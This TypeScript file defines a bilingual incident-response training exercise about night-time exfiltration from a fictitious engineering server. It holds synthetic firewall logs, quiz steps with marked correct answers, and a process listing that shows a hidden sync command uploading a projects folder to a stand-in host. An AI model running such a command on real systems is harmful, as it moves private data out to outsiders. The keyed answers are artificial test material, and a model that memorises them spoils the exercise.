import type { Scenario } from '../model';
import { DE_AE_03, mitigation, PR_IR_01, RS_AN_03, RS_AN_08, RS_CO_02, RS_MI_01, RS_MI_02 } from '../references';
import { iso, jsonLines } from './helpers';

const DAY = '2026-10-08';
const flow = (seconds: number, bytes: number) => ({ timestamp: iso(DAY, seconds), src_ip: '10.60.1.15', host: 'SRV-PLM01', message: `allow tcp 10.60.1.15 -> 198.51.100.99:443 (fileshare-sync.example.net) bytes_out=${bytes}`, user: 'svc-plm' });

const firewall = jsonLines([
  flow(1 * 3600 + 2 * 60, 1_200_000_000),
  flow(1 * 3600 + 21 * 60, 1_350_000_000),
  flow(1 * 3600 + 44 * 60, 1_180_000_000),
  flow(2 * 3600 + 5 * 60, 1_410_000_000),
  { timestamp: iso(DAY, 2 * 3600 + 30 * 60), src_ip: '10.60.1.15', host: 'SRV-PLM01', message: 'baseline: average daily outbound volume of this server over 30 days = 35 MB', user: 'svc-plm' },
]);

const host = `Process listing on SRV-PLM01 (captured 02:40)
PID   USER     COMMAND
1422  svc-plm  plm-server --config /etc/plm/server.conf
8803  svc-plm  /tmp/.cache/sync-agent --dest fileshare-sync.example.net --src /data/plm/projects --chunk 1G
Archive files found: /tmp/.cache/p1.7z ... /tmp/.cache/p5.7z (password-protected)`;

export const exfiltration: Scenario = {
  id: 'exfiltration',
  version: 1,
  title: { en: 'Night-time data exfiltration from an engineering server', fr: 'Exfiltration nocturne depuis un serveur d’ingénierie' },
  difficulty: 'advanced',
  minutes: 20,
  techniques: ['T1567.002', 'T1213'],
  context: {
    en: 'An engineering company (fictitious) keeps product designs on SRV-PLM01. The firewall logs outbound flows; a 30-day baseline of volume per server is available.',
    fr: 'Une société d’ingénierie (fictive) conserve ses plans produits sur SRV-PLM01. Le pare-feu journalise les flux sortants ; une référence sur 30 jours du volume par serveur est disponible.',
  },
  incident: {
    en: 'At 02:30 the volume monitor alerts: SRV-PLM01 has sent over 5 GB to the Internet since 01:00. The server normally talks only to internal clients.',
    fr: 'À 02 h 30, la surveillance des volumes alerte : SRV-PLM01 a envoyé plus de 5 Go vers Internet depuis 01 h 00. Le serveur ne dialogue normalement qu’avec des clients internes.',
  },
  evidence: [
    { id: 'firewall', kind: 'network', title: { en: 'Firewall outbound flows (JSON Lines)', fr: 'Flux sortants du pare-feu (JSON Lines)' }, content: firewall, logFormat: 'json' },
    { id: 'host', kind: 'process', title: { en: 'Process listing and files', fr: 'Liste des processus et fichiers' }, content: host },
  ],
  steps: [
    {
      id: 'establish',
      kind: 'investigation',
      mode: 'multiple',
      points: 10,
      evidence: ['firewall', 'host'],
      references: [DE_AE_03, RS_AN_03],
      prompt: { en: 'What is established?', fr: 'Qu’est-ce qui est établi ?' },
      options: [
        { id: 'volume', correct: true, text: { en: 'About 5.1 GB left the server, more than 100 times its daily average.', fr: 'Environ 5,1 Go sont sortis du serveur, plus de 100 fois sa moyenne quotidienne.' }, feedback: { en: 'Sum of the four flows, compared with the 35 MB baseline.', fr: 'Somme des quatre flux, comparée à la référence de 35 Mo.' } },
        { id: 'tool', correct: true, text: { en: 'A hidden sync tool uploads password-protected archives of the projects folder.', fr: 'Un outil de synchronisation caché envoie des archives protégées par mot de passe du dossier des projets.' }, feedback: { en: 'Archiving and encrypting before upload hides the content from inspection.', fr: 'Archiver et chiffrer avant l’envoi masque le contenu à l’inspection.' } },
        { id: 'account', correct: true, text: { en: 'It runs as the application service account svc-plm.', fr: 'Il s’exécute sous le compte de service applicatif svc-plm.' }, feedback: { en: 'Find out how this account was used to start it.', fr: 'Il faut comprendre comment ce compte a servi à le lancer.' } },
        { id: 'backup', correct: false, text: { en: 'It is the nightly backup to the cloud.', fr: 'C’est la sauvegarde nocturne vers le cloud.' }, feedback: { en: 'The baseline shows no such traffic before, and the tool sits in a hidden temp folder.', fr: 'La référence ne montre pas ce trafic auparavant, et l’outil est dans un dossier temporaire caché.' } },
      ],
    },
    {
      id: 'contain',
      kind: 'containment',
      mode: 'multiple',
      points: 10,
      evidence: ['firewall'],
      references: [RS_MI_01],
      prompt: { en: 'Which containment actions do you take now?', fr: 'Quelles actions de confinement prenez-vous maintenant ?' },
      options: [
        { id: 'block-egress', correct: true, text: { en: 'Block outbound Internet access from SRV-PLM01 at the firewall.', fr: 'Bloquer l’accès sortant vers Internet de SRV-PLM01 au pare-feu.' }, feedback: { en: 'Stops the leak without stopping the service for internal users.', fr: 'Arrête la fuite sans arrêter le service pour les utilisateurs internes.' } },
        { id: 'capture', correct: true, text: { en: 'Capture the process, its memory and the archives before stopping anything.', fr: 'Capturer le processus, sa mémoire et les archives avant d’arrêter quoi que ce soit.' }, feedback: { en: 'Needed to know exactly what was taken.', fr: 'Nécessaire pour savoir précisément ce qui a été pris.' } },
        { id: 'disable', correct: true, text: { en: 'Change the svc-plm credentials and look for its use elsewhere.', fr: 'Changer les identifiants de svc-plm et rechercher son usage ailleurs.' }, feedback: { en: 'The account was used to run the tool.', fr: 'Le compte a servi à lancer l’outil.' } },
        { id: 'delete-archives', correct: false, text: { en: 'Delete the archives right away.', fr: 'Supprimer immédiatement les archives.' }, feedback: { en: 'They are evidence of what was exfiltrated.', fr: 'Ce sont des preuves de ce qui a été exfiltré.' } },
      ],
    },
    {
      id: 'scope',
      kind: 'investigation',
      mode: 'single',
      points: 10,
      evidence: ['host'],
      references: [RS_AN_08],
      prompt: { en: 'How do you determine what data left?', fr: 'Comment déterminez-vous quelles données sont sorties ?' },
      options: [
        { id: 'compare', points: 10, text: { en: 'List the archive contents (or the source folder state at the time) and match volumes with the firewall byte counts.', fr: 'Lister le contenu des archives (ou l’état du dossier source à ce moment) et rapprocher les volumes des octets comptés par le pare-feu.' }, feedback: { en: 'Two independent sources give a defensible estimate.', fr: 'Deux sources indépendantes donnent une estimation défendable.' } },
        { id: 'guess', points: 0, text: { en: 'Assume nothing important left since the archives are encrypted.', fr: 'Considérer que rien d’important n’est sorti puisque les archives sont chiffrées.' }, feedback: { en: 'The attacker holds the password.', fr: 'L’attaquant détient le mot de passe.' } },
      ],
    },
    {
      id: 'notify',
      kind: 'decision',
      mode: 'single',
      points: 10,
      evidence: [],
      references: [RS_CO_02],
      prompt: { en: 'What do you do about notification?', fr: 'Que faites-vous concernant la notification ?' },
      options: [
        { id: 'escalate', points: 10, text: { en: 'Inform management and legal counsel now, so they decide on notifying clients, partners and authorities within the applicable deadlines.', fr: 'Informer dès maintenant la direction et le juridique, pour qu’ils décident de la notification aux clients, partenaires et autorités dans les délais applicables.' }, feedback: { en: 'Contracts and regulations may impose short deadlines.', fr: 'Contrats et réglementations peuvent imposer des délais courts.' } },
        { id: 'wait', points: 3, text: { en: 'Wait until the investigation is complete before telling anyone.', fr: 'Attendre la fin de l’investigation avant d’en parler.' }, feedback: { en: 'Deadlines may run from discovery; escalate early and refine later.', fr: 'Les délais peuvent courir dès la découverte ; remontez tôt et affinez ensuite.' } },
      ],
    },
    {
      id: 'remediate',
      kind: 'remediation',
      mode: 'multiple',
      points: 10,
      evidence: ['firewall'],
      references: [RS_MI_02, PR_IR_01, mitigation('M1037', 'Filter Network Traffic'), mitigation('M1057', 'Data Loss Prevention'), mitigation('M1031', 'Network Intrusion Prevention')],
      prompt: { en: 'Which measures reduce future exfiltration?', fr: 'Quelles mesures réduisent les exfiltrations futures ?' },
      options: [
        { id: 'egress', correct: true, text: { en: 'Deny Internet access to servers by default and allow only required destinations.', fr: 'Interdire par défaut l’accès Internet des serveurs et n’autoriser que les destinations nécessaires.' }, feedback: { en: 'This server had no business need for Internet uploads.', fr: 'Ce serveur n’avait aucun besoin métier d’envoi vers Internet.' } },
        { id: 'volume-alert', correct: true, text: { en: 'Keep and tune the volume-based alerting that caught this.', fr: 'Conserver et ajuster l’alerte sur les volumes qui a détecté l’incident.' }, feedback: { en: 'It detected the leak within 90 minutes.', fr: 'Elle a détecté la fuite en 90 minutes.' } },
        { id: 'svc-hardening', correct: true, text: { en: 'Prevent the service account from interactive use and from running programs outside the application.', fr: 'Empêcher le compte de service de s’utiliser interactivement et de lancer des programmes hors de l’application.' }, feedback: { en: 'Limits what a stolen service account can do.', fr: 'Limite ce que peut faire un compte de service volé.' } },
        { id: 'tls-off', correct: false, text: { en: 'Disable HTTPS so that traffic can be read.', fr: 'Désactiver HTTPS pour pouvoir lire le trafic.' }, feedback: { en: 'This weakens everyone’s security; the archives were encrypted anyway.', fr: 'Cela affaiblit la sécurité de tous ; les archives étaient de toute façon chiffrées.' } },
      ],
    },
  ],
  debrief: {
    en: 'Using the svc-plm account, an intruder started a hidden sync tool that packed the projects folder into encrypted archives and uploaded about 5 GB to a file-sharing service at night. Egress blocking stopped it, captured archives allowed an inventory of what left, and early escalation let management meet notification deadlines.',
    fr: 'Avec le compte svc-plm, un intrus a lancé un outil de synchronisation caché qui a empaqueté le dossier des projets en archives chiffrées et envoyé environ 5 Go vers un service de partage de fichiers la nuit. Le blocage sortant l’a arrêté, les archives capturées ont permis d’inventorier ce qui était sorti, et une remontée précoce a permis à la direction de respecter les délais de notification.',
  },
  lessons: [
    { en: 'Baselines turn "a lot of traffic" into evidence.', fr: 'Une référence transforme « beaucoup de trafic » en preuve.' },
    { en: 'Servers rarely need open Internet egress.', fr: 'Les serveurs ont rarement besoin d’un accès sortant ouvert vers Internet.' },
  ],
};
